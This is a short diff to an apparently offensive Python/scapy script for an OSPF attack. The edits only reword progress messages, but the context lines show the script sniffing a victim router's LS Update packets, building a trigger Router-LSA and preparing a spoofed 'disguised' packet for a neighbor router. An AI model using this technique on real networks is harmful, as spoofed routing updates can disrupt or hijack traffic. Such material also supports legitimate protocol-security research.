@@ -84,7 +84,7 @@ if __name__ == '__main__':
     iface = args.iface
 
     # print confirmation
-    print(">>> Sniffing for LS Update packets from victim on", iface)
+    print(">>> Sniffing for LS Update packets from victim router on", iface)
 
     # Sniffing for packet using scapy sniff module
     packets = sniff(filter="proto ospf", iface=iface, stop_filter=lambda packet: check_packet_get_pos(victim, packet))
@@ -95,7 +95,7 @@ if __name__ == '__main__':
     og_Router_LSA = og_packet[OSPF_LSUpd].lsalist[lsa_position][OSPF_Router_LSA]
 
     # print confirmation
-    print(">>> Preparing trigger packet to send to victim...")
+    print(">>> Preparing trigger packet to send to victim router...")
 
     """
     prepare a trigger packet that is copied off of the original packet sent by victim
@@ -137,7 +137,7 @@ if __name__ == '__main__':
     trigger_Router_LSA.len = None
     trigger_Router_LSA.chksum = None
 
-    print(">>> Preparing disguised packet to send to neighbor...")
+    print(">>> Preparing disguised packet to send to neighbor router...")
 
     # copy the original packet
     spoofed = og_packet.copy()
